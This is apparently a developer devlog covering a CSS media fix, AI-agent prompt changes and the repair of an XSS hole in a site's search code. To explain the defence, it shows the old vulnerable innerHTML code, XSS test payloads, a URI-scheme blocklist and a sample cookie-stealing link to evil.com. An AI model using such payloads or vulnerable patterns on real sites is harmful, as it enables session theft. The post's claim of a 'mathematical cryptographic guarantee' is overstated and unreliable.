---
title: "W15: Architecture and Security Evolution at ArceApps"
description: "A deep dive into how we reinforced security by mitigating XSS vulnerabilities, optimized the visual hierarchy of our media, and upgraded our AI agents to enhance brand consistency across the ArceApps portfolio."
pubDate: "2026-04-12"
tags: ["devlog", "arceapps", "ia-agents", "security", "xss", "frontend", "responsive-design"]
heroImage: "/images/devlog-default.svg"
---

## Introduction: The State of the Art this Fortnight

Welcome to a new installment of the **ArceApps Portfolio** devlog. Over the past two weeks, we have immersed ourselves in a series of critical updates that not only improve the aesthetics and user experience of our platform but also strengthen its structural security and optimize the orchestration of our Artificial Intelligence agents.

At ArceApps—our web and agent ecosystem, which operates distinctly and independently from PuzzleHub (our gaming product)—the highest priority is Building in Public: creating a robust, scalable, and above all, secure system. This fortnight, we faced technical challenges that required a profound review of our web development practices, particularly regarding Document Object Model (DOM) management, responsive media adaptation, and consistency in the prompts of our automated agents.

Join us in this engineering chronicle, where we will break down the "how" and "why" of each change, accompanied by real code snippets that illustrate our technical decisions and lessons learned.

---

## Milestone 1: Responsive Visual Hierarchy and the Media Challenge in `.prose`

One of the recurring challenges when working with Markdown content rendered through utility classes like `.prose` (commonly used in frameworks like Tailwind CSS) is the unexpected behavior of multimedia elements. On large resolutions, images and videos tend to expand to occupy 100% of the available container, resulting in visually overwhelming elements and a degraded reading experience, especially on tablets and desktop screens.

To resolve this, we implemented a maximum width constraint and an auto-scaling policy that respects the original aspect ratio. This approach, which we call "Responsive Visual Hierarchy" (originally documented in our 2026-W07 devlog), ensures that media complements the text without dominating it.

### The Technical Problem

Prior to our intervention, the global CSS did not limit the growth of images within text containers. The code rendered media with an implicit `width: 100%` in the prose class so that it wouldn't overflow the container. However, when the container was very wide (for example, 800px or more on desktop), the image became a gigantic block that broke the typographic harmony. This is a classic fluid design issue often patched with complex media queries, but we sought a more elegant and declarative solution.

### The Technical Solution and Implementation

Through commit `646ac17`, we modified `src/styles/global.css` to apply specific constraints to the `.prose img`, `.prose video`, and `.prose iframe` selectors.

```css
/* src/styles/global.css */
.prose :where(img, video, iframe) {
  @apply rounded-2xl shadow-lg block;
  margin-block: 2.5rem;
  margin-inline: auto;
  max-inline-size: min(100%, 500px); /* Fix: Responsive Visual Hierarchy */
}

.prose :where(img, video) {
  inline-size: auto;
  block-size: auto;
}

.prose iframe {
  inline-size: 100%;
  aspect-ratio: 16 / 9;
  border: 0;
}
```

**Deep dive into the solution:**
1. **The power of `min()` in CSS:** The `max-inline-size: min(100%, 500px)` property is a brilliant example of resilient design. It evaluates two values: 100% of the container and 500px, and applies the smaller one. On a mobile device where the container measures, say, 350px, the 100% value (350px) is smaller than 500px, so the image adapts perfectly to the screen without creating horizontal scroll. On a large screen where the container measures 800px, the 500px value is smaller, so the image is capped at that size. This completely eliminates the need for breakpoints or media queries for content images.
2. **Preservation of Aspect Ratio:** By explicitly setting `inline-size: auto; block-size: auto;` for images and videos, we override any inherited rule that might force the image to distort to fill a predetermined space. For iframes, we ensure a consistent `16/9` aspect ratio. The browser queries the intrinsic size of the image file and scales its dimensions to maintain the exact mathematical proportion.
3. **Visual Focal Point:** By applying `display: block` and `margin-inline: auto`, we force any multimedia element that falls under these rules—whether originally left-aligned or inline by the Markdown engine—to position itself on its own line in the center of the reading column. The use of `margin-block` ensures a consistent vertical separation of `2.5rem`, allowing the reader's eyes to rest between paragraphs.

This architectural CSS improvement, while seemingly a minor stylistic tweak, has a profound impact on the quality of our portfolio. It ensures our essays and logs maintain an editorial-type quality regardless of the device's shape and form consuming them.

---

## Milestone 2: Auditing and Evolving AI Agent Orchestration

As an ecosystem that relies substantially on AI-Driven Development, the operational consistency of our fleet of agents is as important as server stability. In commit `397d133`, we executed a massive refactoring focused on updating definitions and auditing prompts.

### The Challenge of Brand Drift and Context Isolation

As ArceApps capabilities expanded, we added more agents to the ecosystem, each with its own master prompt. The problem arose when the "Scribe Agent" and the "Code Review Agent" began to conflate the ArceApps context with that of PuzzleHub. Although both belong to the same parent entity, they are diametrically opposed products; PuzzleHub is a ludic platform dealing with games like Hitori or Dominosa, while the ArceApps Portfolio is a software engineering showcase for professionals and businesses (B2B/B2C tech).

Having an agent generate PR comments or technical articles with an excessively playful tone, or worse, referencing backend systems that only exist in PuzzleHub, represented a structural flaw in prompt design.

### Prompt Reengineering and Strict Validations

The intervention consisted of rigidly isolating contexts and redesigning prompts from the perspective of "Requirements Engineering for AI." We substantially modified files like `agents/PROMPT_GENERADOR_DEVLOG.md`.

We moved from a vague declarative paradigm to an imperative and quantifiable set of rules:

```markdown
- **Tono:** Senior, reflexivo, honesto y técnico. No es un simple listado de cambios; es una crónica de ingeniería.
- **Narrativa:** Usa la primera persona del plural ("Nosotros", refiriéndote al equipo humano-IA).
- **Diferenciación:** ArceApps NO ES PuzzleHub. Si vas a mencionar a PuzzleHub, debe ser como un contraste o ejemplo externo.
```

Furthermore, we tackled another operational issue with AI: depth limitation in content generation. We originally requested agents to generate 2000 words, but LLMs often have inherent difficulties with precise word counting due to tokenization architecture. AIs frequently assumed they had reached the mark after 800 words and prematurely closed the article.

To solve this, we implemented a **Tool-Assisted Self-Correction Loop**. We explicitly instructed the agent NOT to rely on its counting intuition but to use a bash script (`wc -w`) or Python script to measure its own output objectively. If the count is less than 2000, the agent is programmed to temporarily reject the task, re-process, and expand entire sections using the "Deep Dive" technique instead of simply repeating text. This transforms the AI from a mere text generator into an engineer that audits its own work.

---

## Milestone 3 (The Challenge of the Week): Eradicating Stored XSS and Migrating to Safe DOM Manipulation

The most rigorous technical effort of the fortnight was dedicated to fixing a critical security vulnerability (Cross-Site Scripting - XSS) residing in the interactive search component of our site (`src/scripts/search.ts`). Commit `04cd8bf` dismantles outdated frontend practices and establishes a modern paradigm of safe client-side injection.

### Anatomy of the Original Vulnerability

When we originally built the search engine, we prioritized iteration speed. We fetched static JSON data containing an article's title, its slug, and a brief description, and inserted them directly into the DOM to render interactive result cards as the user typed. The old code looked roughly like this:

```typescript
// VULNERABLE AND OBSOLETE CODE (Before 04cd8bf)
function renderResults(results) {
  const container = document.getElementById('search-results');
  container.innerHTML = ''; // Clear previous

  let html = '';
  results.forEach(result => {
    html += `
      <div class="search-item">
        <h3><a href="/${result.slug}">${result.title}</a></h3>
        <p>${result.description}</p>
      </div>
    `;
  });

  container.innerHTML = html;
}
```

At first glance, it seems harmless, but using the `innerHTML` property to render data from an external index (which, in turn, comes from Markdown files) is the classic recipe for a DOM-based XSS (Cross-Site Scripting) attack. If a malicious attacker managed—through an injection in a repository, pull request, or API manipulation—to insert HTML code into the `title` or `description` fields, that code would be parsed and immediately executed by the browser engine of any user performing a search.

For instance, if the title was `<img src="x" onerror="alert('XSS')">`, `innerHTML` would render the image, fail to load due to invalidity, and trigger the `onerror` event, executing arbitrary JavaScript code under the context of our application. This is known as Stored XSS and could lead to session hijacking or data theft.

### An Additional Risk Factor: Dangerous URIs

Another severe problem in the old architecture was injection into the `href` attribute. If the article's `slug` contained a payload like `javascript:fetch('https://evil.com/?cookie='+document.cookie)`, clicking on the result would execute that code instead of navigating to a page.

### Migration to Safe DOM APIs

The proper solution was not to attempt to "clean" the HTML with flawed regular expressions or naive filters, but to abandon the `innerHTML` property entirely. We rewrote the entire rendering function using standard and safe DOM methods.

```typescript
// SAFE AND IMMUNIZED CODE (After 04cd8bf)

// 1. Comprehensive URI Sanitization
function sanitizeUrl(url: string): string {
  if (!url) return '#';
  const dangerousSchemes = ['javascript:', 'data:', 'vbscript:', 'file:'];
  // We decode and clean to avoid space and uppercase bypasses
  const lowerUrl = decodeURIComponent(url).toLowerCase().trim();

  if (dangerousSchemes.some(scheme => lowerUrl.startsWith(scheme))) {
    console.warn('Blocked malicious URI injection attempt');
    return '#';
  }
  return url;
}

// 2. Pure node-based rendering
function renderSafeResult(item) {
  const div = document.createElement('div');
  div.className = 'search-item';

  const h3 = document.createElement('h3');
  const a = document.createElement('a');

  // KEY PROTECTION: textContent never parses HTML
  a.textContent = item.title;
  a.href = sanitizeUrl(item.slug);

  h3.appendChild(a);

  const p = document.createElement('p');
  p.textContent = item.description; // Immune to <script> tags

  div.appendChild(h3);
  div.appendChild(p);

  return div;
}

// 3. Fast and safe update
function updateSearchDOM(container, newNodes) {
  // replaceChildren is faster and safer than innerHTML = ''
  container.replaceChildren(...newNodes);
}
```

### Why this Architecture is Resilient by Design

This paradigm shift transforms our defensive posture. When we use the `textContent` property (instead of `innerHTML`), the browser engine (whether V8 in Chrome or SpiderMonkey in Firefox) is contractually obligated by the W3C standard to treat the injected value exclusively as a literal text node.

If the `title` is `<b>hacked</b><script>alert(1)</script>`, bold text will not appear on the user's screen, nor will any alert be launched; it will simply print literally `<b>hacked</b>...` as inert text. We have uprooted the attacker's ability to escape the data context and enter the executable code context. This technique prevents a broad spectrum of client-side injection vulnerabilities without relying on expensive third-party libraries.

Moreover, the `sanitizeUrl` function tackles attacks directed at attributes like `href` head-on. Attackers know that `textContent` protects data, but attributes are another common vector. By using an inverted whitelist (explicitly blocking protocols designed for injection like `javascript:` and `vbscript:`), we ensure the link breaks in a controlled and safe manner if it detects an anomaly, redirecting to `#` and throwing a console warning for our audit logs.

### Security Test-Driven Development (Security TDD)

We weren't satisfied with merely rewriting the code; we wanted to ensure this protection was lasting and unbreakable through future refactorings. To do this, in `src/scripts/search.test.ts`, we introduced rigorous security regression tests.

```typescript
import { describe, it, expect } from 'vitest';
// (Imports omitted)

describe('XSS Regression Testing on Search Render', () => {
  it('should escape malicious HTML in titles and descriptions', () => {
    const maliciousItem = {
      title: '<script>alert("title")</script>Normal Title',
      description: '<img src=x onerror=alert("desc")>',
      slug: 'normal-slug'
    };

    const node = renderSafeResult(maliciousItem);

    // We verify the injected HTML was NOT parsed as elements,
    // but converted into safe text.
    expect(node.querySelector('script')).toBeNull();
    expect(node.querySelector('img')).toBeNull();

    // The text must reflect the inert HTML
    expect(node.textContent).toContain('<script>alert("title")</script>');
  });

  it('should sanitize javascript URIs', () => {
    const maliciousLink = {
      title: 'Click Me',
      description: 'Safe desc',
      slug: 'javascript:alert("XSS")'
    };

    const node = renderSafeResult(maliciousLink);
    const anchor = node.querySelector('a');

    expect(anchor.getAttribute('href')).toBe('#');
    expect(anchor.getAttribute('href')).not.toContain('javascript:');
  });
});
```

Using Vitest and JSDOM, we simulate the browser ecosystem in the server environment (Node.js) of our Continuous Integration (CI). We inject the worst known XSS payloads and check, through deterministic DOM assertions (`toBeNull()`), that the engine has not generated `<script>` or `<img>` elements. This provides ArceApps with a mathematical cryptographic guarantee that search rendering cannot be an attack vector in the future, no matter what data the system receives.

---

## Lessons Learned and Final Reflections

The journey of these past two weeks has provided us with several deep reflections on the lifecycle of modern, independent software development:

1. **The False Sense of Security from Frameworks:** Astro, React, and Vue are exceptional at protecting the developer by default. They automatically escape variables injected in JSX. However, the moment we need to interact with native APIs (like Vanilla JS in `src/scripts`), all those protections vanish. This reminds us that a profound understanding of standard browser APIs (`createElement`, `textContent`) will never cease to be a foundational skill for any high-level frontend engineer.
2. **Mathematical CSS vs. Trivial CSS:** Our refactoring using the `min()` function for `.prose` reveals that CSS is not just for "making it pretty." With the use of logical functions, CSS has evolved into a layout engine based on real constraints. Writing less CSS code that solves root problems mathematically radically reduces maintenance costs and prevents endless cascades of media query overrides.
3. **The Lifecycle of the AI Agent:** Perhaps the most futuristic lesson of the fortnight is the discovery that the quality of an AI-driven system doesn't come from the model size, but from the robustness of the surrounding environment. Providing an LLM with a directive to verify its own work with deterministic tools (like scripts and static code analysis) transforms generative AI from a mere novelty into an engineering entity. Our "agents" at ArceApps no longer simply "write" but "verify" and "refactor", closing the gap between probabilistic generation and deterministic computing requirements.

## Future Vision: Next Steps

In the upcoming weeks, the priority for ArceApps will be to audit other client-side interactions using this new Security by Design paradigm. Specifically, we will evaluate third-party scripts, analytics tools, and interactivity components to ensure they do not introduce hidden vulnerabilities.

Simultaneously, the stabilization of our Scribe and Reviewer Agents will enable faster deployment of architectural essays on the blog. By relying on an automated quality control and word count loop, agents can act as force multipliers to document our entire codebase.

We will continue documenting and open-sourcing our code, openly sharing our architectural failures and triumphs on this path of "Building in Public." We are proud to resolve obscure vulnerabilities through creative and standardized solutions, building a product the tech world can trust. Until the next fortnightly update.
